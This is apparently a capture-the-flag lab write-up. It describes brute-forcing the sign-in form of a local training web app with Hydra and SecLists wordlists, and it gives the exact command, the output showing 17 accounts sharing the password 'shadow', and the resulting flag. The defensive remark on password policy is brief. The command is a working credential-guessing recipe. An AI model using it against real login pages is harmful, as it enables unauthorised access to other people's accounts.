## Bruteforce attack with a dictionary

This vulnerability is on the signin page: http://localhost:8080/index.php?page=signin.

How to defend : password policy, non-simple passwords

intuition is last flag is probably signin page
let's try and bruteforce the password
installed hydra locally

```
10191  ./configure --prefix=$HOME/hydra\n
10192  make
10193  make install prefix=$HOME/hydra\n
```

dont' forget to source the path .zshrc

```
➜  ~ hydra -L sgoinfre/SecLists/Usernames/top-usernames-shortlist.txt -P sgoinfre/SecLists/Passwords/2020-200_most_used_passwords.txt -s 8080 localhost http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-29 13:40:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3349 login tries (l:17/p:197), ~210 tries per task
[DATA] attacking http-get-form://localhost:8080/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
[8080][http-get-form] host: localhost   login: root   password: shadow
[8080][http-get-form] host: localhost   login: admin   password: shadow
[STATUS] 407.00 tries/min, 407 tries in 00:01h, 2942 to do in 00:08h, 16 active
[8080][http-get-form] host: localhost   login: test   password: shadow
[8080][http-get-form] host: localhost   login: guest   password: shadow
[8080][http-get-form] host: localhost   login: info   password: shadow
[8080][http-get-form] host: localhost   login: adm   password: shadow
[STATUS] 400.33 tries/min, 1201 tries in 00:03h, 2148 to do in 00:06h, 16 active
[8080][http-get-form] host: localhost   login: mysql   password: shadow
[8080][http-get-form] host: localhost   login: user   password: shadow
[8080][http-get-form] host: localhost   login: administrator   password: shadow
[8080][http-get-form] host: localhost   login: oracle   password: shadow
[8080][http-get-form] host: localhost   login: ftp   password: shadow
[8080][http-get-form] host: localhost   login: pi   password: shadow
[8080][http-get-form] host: localhost   login: puppet   password: shadow
[8080][http-get-form] host: localhost   login: ansible   password: shadow
[STATUS] 397.57 tries/min, 2783 tries in 00:07h, 566 to do in 00:02h, 16 active
[8080][http-get-form] host: localhost   login: ec2-user   password: shadow
[8080][http-get-form] host: localhost   login: vagrant   password: shadow
[STATUS] 397.38 tries/min, 3179 tries in 00:08h, 170 to do in 00:01h, 16 active
[8080][http-get-form] host: localhost   login: azureuser   password: shadow
1 of 1 target successfully completed, 17 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-29 13:48:49
```

not very secure hm, using any user with shadow as password leads to : "The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 " !
